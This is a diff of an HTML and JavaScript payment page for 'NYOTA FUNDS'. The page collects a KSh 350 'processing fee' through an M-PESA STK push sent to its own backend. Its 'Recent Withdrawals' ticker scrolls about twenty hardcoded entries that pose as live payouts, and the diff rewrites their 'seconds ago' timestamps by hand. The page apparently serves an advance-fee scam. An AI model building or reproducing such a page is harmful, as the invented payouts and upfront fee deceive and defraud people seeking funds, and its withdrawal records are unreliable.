@@ -1,5 +1,13 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>NYOTA FUNDS</title>
+
+<style>
 
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
 
@@ -7,14 +15,9 @@
     box-sizing:border-box;
 }
 
-html,body{
-    margin:0;
-    padding:0;
-    width:100%;
-}
-
 body{
-    padding:8px 7px;
+    margin:0;
+    padding:10px 8px;
     font-family:'Mali',sans-serif;
     background:#0B0217;
     color:#fff;
@@ -26,10 +29,9 @@ body{
     margin:0 auto;
 }
 
-
-/* =================================
+/* ================================
    PAYMENT CARD
-================================= */
+================================ */
 
 .card{
     width:100%;
@@ -40,8 +42,7 @@ body{
             rgba(255,255,255,0.035)
         );
 
-    padding:18px 14px;
-
+    padding:18px 15px 15px;
     border-radius:18px;
 
     box-shadow:
@@ -51,37 +52,33 @@ body{
     border:1px solid rgba(255,255,255,0.10);
 }
 
-
 h1{
     text-align:center;
     color:#D4AF37;
-    font-size:22px;
+    font-size:21px;
     font-weight:700;
     margin:2px 0 10px;
 }
-
 
 p{
     text-align:center;
     font-size:13px;
     line-height:1.4;
     color:rgba(255,255,255,0.72);
-    margin:7px 0;
+    margin:8px 0;
 }
-
 
 .amount{
     background:rgba(212,175,55,0.055);
     border:1px solid rgba(212,175,55,0.25);
     border-radius:12px;
-    padding:12px 10px;
+    padding:11px 10px;
     font-size:19px;
     font-weight:700;
     text-align:center;
     color:#fff;
-    margin:10px 0;
+    margin:11px 0;
 }
-
 
 label{
     display:block;
@@ -92,10 +89,9 @@ label{
     color:rgba(255,255,255,0.88);
 }
 
-
 input{
     width:100%;
-    height:45px;
+    height:48px;
     padding:0 12px;
     border:1px solid rgba(255,255,255,0.12);
     border-radius:10px;
@@ -106,24 +102,28 @@ input{
     outline:none;
 }
 
-
 input:focus{
     border-color:rgba(212,175,55,0.8);
     box-shadow:0 0 0 3px rgba(212,175,55,0.10);
 }
 
-
-/* =================================
+/* ================================
    PAY PROCESSING FEE BUTTON
-================================= */
+================================ */
 
 button{
     width:100%;
-    height:48px;
-    min-height:48px;
+    height:54px;
+    min-height:54px;
+
+    margin-top:12px;
+    margin-bottom:12px;
+
     padding:0 15px;
-    margin-top:11px;
-    margin-bottom:11px;
+
+    display:flex;
+    align-items:center;
+    justify-content:center;
 
     background:
         linear-gradient(
@@ -139,32 +139,17 @@ button{
     font-family:'Mali',sans-serif;
     font-size:16px;
     font-weight:700;
-    cursor:pointer;
 
-    display:flex;
-    align-items:center;
-    justify-content:center;
+    cursor:pointer;
 
     box-shadow:
         0 10px 30px rgba(212,175,55,0.20),
         inset 0 1px 0 rgba(255,255,255,0.55);
 }
 
-
-button:hover{
-    background:
-        linear-gradient(
-            135deg,
-            #D4AF37,
-            #A67C00
-        );
-}
-
-
 button:active{
     transform:scale(.98);
 }
-
 
 button:disabled{
     background:rgba(255,255,255,0.25);
@@ -173,9 +158,8 @@ button:disabled{
     box-shadow:none;
 }
 
-
 #stkMessage{
-    min-height:20px;
+    min-height:18px;
     margin:0;
     color:#D4AF37;
     font-size:12px;
@@ -189,13 +173,13 @@ button:disabled{
 ================================= */
 
 .activity-box{
-    margin-top:8px;
+    margin-top:10px;
 
     background:#1D293B;
 
-    border-radius:22px;
+    border-radius:24px;
 
-    padding:14px 9px 15px;
+    padding:15px 9px 15px;
 
     overflow:hidden;
 
@@ -203,31 +187,27 @@ button:disabled{
         0 20px 60px rgba(0,0,0,0.45);
 }
 
-
 .activity-title{
     text-align:center;
 
-    font-size:19px;
+    font-size:20px;
 
     font-weight:700;
 
     color:#fff;
 
-    margin:0 0 10px;
+    margin:0 0 12px;
 }
-
 
 .activity-title span{
     margin-right:6px;
 }
 
 
-/* =================================
-   SCROLL WINDOW
-================================= */
+/* Visible window */
 
 .activity-window{
-    height:430px;
+    height:390px;
 
     overflow:hidden;
 
@@ -235,38 +215,33 @@ button:disabled{
 }
 
 
+/* Moving track */
+
 .activity-track{
     display:flex;
 
     flex-direction:column;
 
-    gap:9px;
+    gap:10px;
 
-    animation:
-        scrollActivity
-        35s
-        linear
-        infinite;
+    animation:scrollActivity 35s linear infinite;
 }
-
 
 .activity-window:active .activity-track{
     animation-play-state:paused;
 }
 
 
-/* =================================
-   WITHDRAWAL CARD
-================================= */
+/* Withdrawal card */
 
 .activity-item{
     min-height:88px;
 
     background:#020617;
 
-    border-radius:17px;
+    border-radius:18px;
 
-    border-left:5px solid #19C37D;
+    border-left:6px solid #19C37D;
 
     display:flex;
 
@@ -274,20 +249,23 @@ button:disabled{
 
     justify-content:space-between;
 
-    padding:11px 10px 11px 12px;
+    padding:12px 10px 12px 13px;
 
     flex-shrink:0;
 }
 
+
+/* Information */
 
 .activity-info{
     display:flex;
 
     flex-direction:column;
 
-    gap:3px;
-}
+    gap:4px;
 
+    min-width:0;
+}
 
 .activity-phone{
     font-size:15px;
@@ -297,7 +275,6 @@ button:disabled{
     color:#fff;
 }
 
-
 .activity-amount{
     font-size:14px;
 
@@ -306,17 +283,14 @@ button:disabled{
     color:#fff;
 }
 
-
 .activity-time{
-    font-size:10px;
+    font-size:11px;
 
-    color:rgba(255,255,255,0.48);
+    color:rgba(255,255,255,0.55);
 }
 
 
-/* =================================
-   STATUS
-================================= */
+/* Status */
 
 .activity-status{
     background:rgba(0,166,81,0.20);
@@ -325,7 +299,7 @@ button:disabled{
 
     border-radius:40px;
 
-    padding:9px 10px;
+    padding:9px 8px;
 
     font-size:9px;
 
@@ -335,13 +309,11 @@ button:disabled{
 
     text-align:center;
 
-    margin-left:6px;
+    margin-left:5px;
 }
 
 
-/* =================================
-   SCROLL
-================================= */
+/* Continuous upward movement */
 
 @keyframes scrollActivity{
 
@@ -357,59 +329,70 @@ button:disabled{
 
 
 /* =================================
-   SMALL PHONES
+   VERY SMALL PHONES
 ================================= */
 
 @media(max-width:360px){
 
     body{
-        padding:6px;
+        padding:7px 6px;
     }
 
     .card{
-        padding:15px 11px;
+        padding:15px 12px 12px;
         border-radius:15px;
     }
 
     h1{
-        font-size:20px;
+        font-size:19px;
     }
 
     p{
         font-size:12px;
+        margin:6px 0;
     }
 
     .amount{
         font-size:18px;
         padding:10px;
+        margin:9px 0;
+    }
+
+    label{
+        font-size:12px;
+        margin-top:7px;
     }
 
     input{
-        height:42px;
+        height:45px;
+        font-size:14px;
     }
 
     button{
-        height:45px;
-        min-height:45px;
+        height:50px;
+        min-height:50px;
         font-size:15px;
     }
 
     .activity-box{
-        padding:12px 7px;
-        border-radius:20px;
+        margin-top:8px;
+        padding:13px 7px;
+        border-radius:21px;
     }
 
     .activity-title{
         font-size:18px;
+        margin-bottom:10px;
     }
 
     .activity-window{
-        height:380px;
+        height:350px;
     }
 
     .activity-item{
-        min-height:82px;
-        padding:10px 8px 10px 10px;
+        min-height:80px;
+        padding:10px 8px 10px 11px;
+        border-radius:17px;
     }
 
     .activity-phone{
@@ -420,399 +403,627 @@ button:disabled{
         font-size:13px;
     }
 
+    .activity-time{
+        font-size:10px;
+    }
+
     .activity-status{
-        padding:8px 7px;
+        padding:8px 6px;
         font-size:8px;
     }
 
 }
 
-</style></head><body><div class="container"><!-- =================================
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+
+<!-- =================================
      PAYMENT SECTION
-================================= --><div class="card"><h1>PROCESSING FEE</h1><p>
+================================= -->
+
+<div class="card">
+
+<h1>PROCESSING FEE</h1>
+
+<p>
 Welcome, <strong><span id="name"></span></strong>
-</p><p>
+</p>
+
+<p>
 To continue with your NYOTA Fund application, please complete the processing fee payment below.
-</p><div class="amount" id="feeAmount">
+</p>
+
+<div class="amount" id="feeAmount">
 Processing Fee: KSh 350
-</div><label>Full Name</label>
+</div>
+
+
+<label>Full Name</label>
 
 <input
-type="text"
-id="fullName"
-readonly
+    type="text"
+    id="fullName"
+    readonly
+>
 
-«»
 
 <label>M-PESA Phone Number</label>
 
 <input
-type="tel"
-id="phone"
-placeholder="2547XXXXXXXX"
+    type="tel"
+    id="phone"
+    placeholder="2547XXXXXXXX"
+>
 
-«»
+
+<!-- PAY PROCESSING FEE BUTTON -->
 
 <button
-id="payBtn"
-onclick="payNow()"
+    id="payBtn"
+    onclick="payNow()"
+>
+    Pay Processing Fee
+</button>
 
-«»
 
-Pay Processing Fee
+<p id="stkMessage"></p>
 
-</button><p id="stkMessage"></p></div><!-- =================================
+</div>
+
+
+
+<!-- =================================
      RECENT WITHDRAWALS
-================================= --><div class="activity-box"><div class="activity-title"><span>📊</span>
-Recent Withdrawals
+================================= -->
 
-</div><div class="activity-window"><div class="activity-track"><!-- WITHDRAWAL 1 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0702****5
-</div><div class="activity-amount">
-KSh. 2,626
-</div><div class="activity-time">
-2 seconds ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 2 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0115****0
-</div><div class="activity-amount">
-KSh. 683
-</div><div class="activity-time">
-18 seconds ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 3 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0757****0
-</div><div class="activity-amount">
-KSh. 4,809
-</div><div class="activity-time">
-32 seconds ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 4 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0722****9
-</div><div class="activity-amount">
-KSh. 1,581
-</div><div class="activity-time">
-48 seconds ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 5 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0719****7
-</div><div class="activity-amount">
-KSh. 2,750
-</div><div class="activity-time">
-1 minute ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 6 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0749****6
-</div><div class="activity-amount">
-KSh. 1,839
-</div><div class="activity-time">
-1 minute ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 7 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0791****3
-</div><div class="activity-amount">
-KSh. 3,420
-</div><div class="activity-time">
-1 minute ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 8 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0708****1
-</div><div class="activity-amount">
-KSh. 2,145
-</div><div class="activity-time">
-2 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 9 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0728****4
-</div><div class="activity-amount">
-KSh. 5,120
-</div><div class="activity-time">
-2 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 10 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0712****8
-</div><div class="activity-amount">
-KSh. 1,960
-</div><div class="activity-time">
-2 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 11 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0798****2
-</div><div class="activity-amount">
-KSh. 3,075
-</div><div class="activity-time">
-3 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 12 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0705****9
-</div><div class="activity-amount">
-KSh. 2,390
-</div><div class="activity-time">
-3 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 13 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0740****5
-</div><div class="activity-amount">
-KSh. 4,250
-</div><div class="activity-time">
-3 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 14 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0725****6
-</div><div class="activity-amount">
-KSh. 1,725
-</div><div class="activity-time">
-4 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 15 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0710****4
-</div><div class="activity-amount">
-KSh. 2,880
-</div><div class="activity-time">
-4 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 16 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0786****1
-</div><div class="activity-amount">
-KSh. 3,650
-</div><div class="activity-time">
-4 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 17 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0701****8
-</div><div class="activity-amount">
-KSh. 1,245
-</div><div class="activity-time">
-5 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 18 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0733****2
-</div><div class="activity-amount">
-KSh. 4,500
-</div><div class="activity-time">
-5 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 19 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0772****7
-</div><div class="activity-amount">
-KSh. 2,175
-</div><div class="activity-time">
-5 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- WITHDRAWAL 20 --><div class="activity-item"><div class="activity-info"><div class="activity-phone">
-0750****3
-</div><div class="activity-amount">
-KSh. 3,890
-</div><div class="activity-time">
-5 minutes ago
-</div></div><div class="activity-status">
-✓ WITHDRAWAL SUCCESS
-</div></div><!-- =================================
-     DUPLICATE FOR CONTINUOUS SCROLL
-================================= --><div class="activity-item">
+<div class="activity-box">
+
+<div class="activity-title">
+<span>📊</span>
+Recent Withdrawals
+</div>
+
+
+<div class="activity-window">
+
+<div class="activity-track">
+
+
+<!-- 1 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0702****5</div>
 <div class="activity-amount">KSh. 2,626</div>
-<div class="activity-time">2 seconds ago</div>
+<div class="activity-time">5 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 2 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0115****0</div>
 <div class="activity-amount">KSh. 683</div>
-<div class="activity-time">18 seconds ago</div>
+<div class="activity-time">4 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 3 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0757****0</div>
 <div class="activity-amount">KSh. 4,809</div>
-<div class="activity-time">32 seconds ago</div>
+<div class="activity-time">4 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 4 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0722****9</div>
 <div class="activity-amount">KSh. 1,581</div>
-<div class="activity-time">48 seconds ago</div>
+<div class="activity-time">3 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 5 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0719****7</div>
 <div class="activity-amount">KSh. 2,750</div>
-<div class="activity-time">1 minute ago</div>
+<div class="activity-time">3 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 6 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0749****6</div>
 <div class="activity-amount">KSh. 1,839</div>
-<div class="activity-time">1 minute ago</div>
+<div class="activity-time">2 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 7 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0791****3</div>
 <div class="activity-amount">KSh. 3,420</div>
-<div class="activity-time">1 minute ago</div>
+<div class="activity-time">2 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 8 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0708****1</div>
 <div class="activity-amount">KSh. 2,145</div>
-<div class="activity-time">2 minutes ago</div>
+<div class="activity-time">1 minute ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 9 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0728****4</div>
 <div class="activity-amount">KSh. 5,120</div>
-<div class="activity-time">2 minutes ago</div>
+<div class="activity-time">59 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 10 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0712****8</div>
 <div class="activity-amount">KSh. 1,960</div>
-<div class="activity-time">2 minutes ago</div>
+<div class="activity-time">52 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 11 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0798****2</div>
 <div class="activity-amount">KSh. 3,075</div>
-<div class="activity-time">3 minutes ago</div>
+<div class="activity-time">45 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 12 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0705****9</div>
 <div class="activity-amount">KSh. 2,390</div>
-<div class="activity-time">3 minutes ago</div>
+<div class="activity-time">38 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 13 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0740****5</div>
 <div class="activity-amount">KSh. 4,250</div>
-<div class="activity-time">3 minutes ago</div>
+<div class="activity-time">31 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 14 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0725****6</div>
 <div class="activity-amount">KSh. 1,725</div>
-<div class="activity-time">4 minutes ago</div>
+<div class="activity-time">24 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 15 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0710****4</div>
 <div class="activity-amount">KSh. 2,880</div>
-<div class="activity-time">4 minutes ago</div>
+<div class="activity-time">18 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 16 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0786****1</div>
 <div class="activity-amount">KSh. 3,650</div>
-<div class="activity-time">4 minutes ago</div>
+<div class="activity-time">12 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 17 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0701****8</div>
 <div class="activity-amount">KSh. 1,245</div>
-<div class="activity-time">5 minutes ago</div>
+<div class="activity-time">8 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 18 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0733****2</div>
 <div class="activity-amount">KSh. 4,500</div>
-<div class="activity-time">5 minutes ago</div>
+<div class="activity-time">5 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 19 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0772****7</div>
 <div class="activity-amount">KSh. 2,175</div>
-<div class="activity-time">5 minutes ago</div>
+<div class="activity-time">3 seconds ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div><div class="activity-item">
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+<!-- 20 -->
+
+<div class="activity-item">
 <div class="activity-info">
 <div class="activity-phone">0750****3</div>
 <div class="activity-amount">KSh. 3,890</div>
+<div class="activity-time">2 seconds ago</div>
+</div>
+
+<div class="activity-status">
+✓ WITHDRAWAL
+</div>
+</div>
+
+
+
+<!-- =================================
+     DUPLICATE 20
+================================= -->
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0702****5</div>
+<div class="activity-amount">KSh. 2,626</div>
 <div class="activity-time">5 minutes ago</div>
 </div>
-<div class="activity-status">✓ WITHDRAWAL SUCCESS</div>
-</div></div></div></div></div><script>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0115****0</div>
+<div class="activity-amount">KSh. 683</div>
+<div class="activity-time">4 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0757****0</div>
+<div class="activity-amount">KSh. 4,809</div>
+<div class="activity-time">4 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0722****9</div>
+<div class="activity-amount">KSh. 1,581</div>
+<div class="activity-time">3 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0719****7</div>
+<div class="activity-amount">KSh. 2,750</div>
+<div class="activity-time">3 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0749****6</div>
+<div class="activity-amount">KSh. 1,839</div>
+<div class="activity-time">2 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0791****3</div>
+<div class="activity-amount">KSh. 3,420</div>
+<div class="activity-time">2 minutes ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0708****1</div>
+<div class="activity-amount">KSh. 2,145</div>
+<div class="activity-time">1 minute ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0728****4</div>
+<div class="activity-amount">KSh. 5,120</div>
+<div class="activity-time">59 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0712****8</div>
+<div class="activity-amount">KSh. 1,960</div>
+<div class="activity-time">52 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0798****2</div>
+<div class="activity-amount">KSh. 3,075</div>
+<div class="activity-time">45 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0705****9</div>
+<div class="activity-amount">KSh. 2,390</div>
+<div class="activity-time">38 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0740****5</div>
+<div class="activity-amount">KSh. 4,250</div>
+<div class="activity-time">31 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0725****6</div>
+<div class="activity-amount">KSh. 1,725</div>
+<div class="activity-time">24 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0710****4</div>
+<div class="activity-amount">KSh. 2,880</div>
+<div class="activity-time">18 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0786****1</div>
+<div class="activity-amount">KSh. 3,650</div>
+<div class="activity-time">12 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0701****8</div>
+<div class="activity-amount">KSh. 1,245</div>
+<div class="activity-time">8 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0733****2</div>
+<div class="activity-amount">KSh. 4,500</div>
+<div class="activity-time">5 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0772****7</div>
+<div class="activity-amount">KSh. 2,175</div>
+<div class="activity-time">3 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
+
+<div class="activity-item">
+<div class="activity-info">
+<div class="activity-phone">0750****3</div>
+<div class="activity-amount">KSh. 3,890</div>
+<div class="activity-time">2 seconds ago</div>
+</div>
+<div class="activity-status">✓ WITHDRAWAL</div>
+</div>
 
 
-/* =================================
+</div>
+</div>
+</div>
+
+</div>
+
+
+<script>
+
+/* =========================================
    LOAD APPLICANT NAME
-================================= */
+========================================= */
 
 let applicant =
     localStorage.getItem("applicantName");
 
-
 document.getElementById("name").innerHTML =
     applicant || "Applicant";
-
 
 document.getElementById("fullName").value =
     applicant || "";
 
 
-
-/* =================================
+/* =========================================
    LOAD PROCESSING FEE
-================================= */
+========================================= */
 
 let processingFee =
     localStorage.getItem("processingFee") || "350";
-
 
 document.getElementById("feeAmount").innerHTML =
     "Processing Fee: KSh " +
     Number(processingFee).toLocaleString();
 
 
-
-/* =================================
+/* =========================================
    START STK PUSH
-================================= */
+========================================= */
 
 async function payNow(){
 
     let phone =
-        document.getElementById("phone")
-        .value
-        .trim();
-
+        document.getElementById("phone").value.trim();
 
     if(phone === ""){
 
@@ -823,70 +1034,54 @@ async function payNow(){
         return;
     }
 
-
     localStorage.setItem(
         "phoneNumber",
         phone
     );
 
-
     localStorage.setItem(
         "fullName",
-        document.getElementById(
-            "fullName"
-        ).value
+        document.getElementById("fullName").value
     );
 
-
     let btn =
-        document.getElementById(
-            "payBtn"
-        );
-
+        document.getElementById("payBtn");
 
     btn.innerHTML =
         "Sending STK Push...";
 
-
     btn.disabled = true;
-
 
     try{
 
-        let response =
-            await fetch(
-                "https://nyota-funds-backend.onrender.com/stk-push",
-                {
-                    method:"POST",
+        let response = await fetch(
+            "https://nyota-funds-backend.onrender.com/stk-push",
+            {
+                method:"POST",
 
-                    headers:{
-                        "Content-Type":
-                            "application/json"
-                    },
+                headers:{
+                    "Content-Type":
+                        "application/json"
+                },
 
-                    body:JSON.stringify({
+                body:JSON.stringify({
 
-                        phone:phone,
+                    phone:phone,
 
-                        amount:
-                            Number(
-                                processingFee
-                            )
+                    amount:
+                        Number(processingFee)
 
-                    })
-                }
-            );
-
+                })
+            }
+        );
 
         let data =
             await response.json();
-
 
         console.log(
             "STK RESPONSE:",
